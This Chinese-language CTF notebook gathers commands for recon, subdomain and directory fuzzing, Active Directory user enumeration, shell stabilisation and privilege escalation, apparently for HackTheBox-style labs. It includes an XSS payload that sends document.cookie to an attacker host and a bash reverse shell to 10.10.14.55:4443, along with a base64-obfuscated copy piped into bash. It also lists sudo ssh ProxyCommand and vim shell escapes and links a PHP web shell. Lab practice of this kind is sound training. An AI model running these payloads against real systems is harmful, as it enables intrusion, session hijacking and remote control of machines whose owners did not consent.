# **Web-CTF筆記**

紀錄CTF時常用的指令與技巧

## 連續流程

進入連線後

```
1. 確認目標 IP & tun0 與計畫名稱
2. sudo nmap -sC -sV -T4 -vvvv <TARGET_IP> -oA <project_name>
3. 若目標有域名，將其加入 /etc/hosts 
4. 檢查網頁是否有信箱或是導向域名
5. 子域名搜尋
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://target.com/" -H "Host: FUZZ.target.com" --hw 1036 -t 5
6. 網頁搜尋
dirsearch -u "http://devvortex.htb/"
feroxbuster
7. 檢查服務框架、curl -v 是否有相關exploit
8. 檢查網頁內容
```



取得shell後

```python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z  //回到原指令框
stty raw -echo; fg
export TERM=xterm (or)
export SHELL=bash
```



## **Reconnaissance-偵查**

amass enum -brute -d [nsh.tw](http://nsh.tw/)

nmap

```
#簡單scan
sudo nmap -p- -sC -sV 10.129.58.70 --open
#完全scan
nmap -sC -sV -sU -T4 -Pn 10.10.11.248
#
-sU：UDP 掃描。
-Pn：這個選項跳過目標存活檢測（ping 掃描）。Nmap 通常先檢查目標是否存活，然後再執行更徹底的掃描。如果你已知目標是活躍的，或者想要掃描那些屏蔽了 ping 請求的主機，可以使用這個選項。
```

AXFR搜尋

```
nslookup -type=any -query=AXFR
dig @dns.example.com example.com AXFR
```

wfuzz 子域名枚舉

```
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "<http://target.com/>" -H "Host: FUZZ.target.com" --hw 1036 -t 5
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

subdir

```
dirsearch -u "<http://devvortex.htb/>"
feroxbuster
```

### **Active Directory**

```
ldapsearch -x -H ldap://monitored.htb -D '' -w '' -b "DC=monitored,DC=htb"
```

枚舉用戶

```
/kerbrute_linux_amd64  userenum -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.236
```

弱掃

```jsx
nuclei
```

XSS

```bash
<img src=x onerror=fetch("http://<your_ip>:port/"+document.cookie);>
```

## **Resource Development**

Acquire Access

1. 預設密碼
2. 常用密碼爆破

### **RevShell**

https://www.revshells.com/

```
#Payload:
bash -i >& /dev/tcp/10.10.14.55/4443 0>&1

#Obfuscation
echo 'bash -i >& /dev/tcp/10.10.14.55/4443 0>&1' | base64 -w 0
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NS80NDQzIDA+JjEK' | base64 -d | bash
```

### **proxychain**

```
ssh -D port kali@跳板

修改 /etc/proxychains.conf
```

## **Privilege Escalation**

linux基本流程

```
lsb_release -a
uname -a
service --status-all
id
find / -perm -u=s -type f 2>/dev/null
sudo -l
LinEnum
getcap -r /
找資料
/var/spool/mail
```

windows基本流程

```
whoami
whoami /priv
systeminfo
tasklist
#powershell
Get-Service
```

ssh

```
sudo /usr/bin/ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```

vim

```
:!/bin/sh
!/bin/bash
```

穩定shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z  //回到原指令框
stty raw -echo; fg
export TERM=xterm (or)
export SHELL=bash
```

https://github.com/flozz/p0wny-shell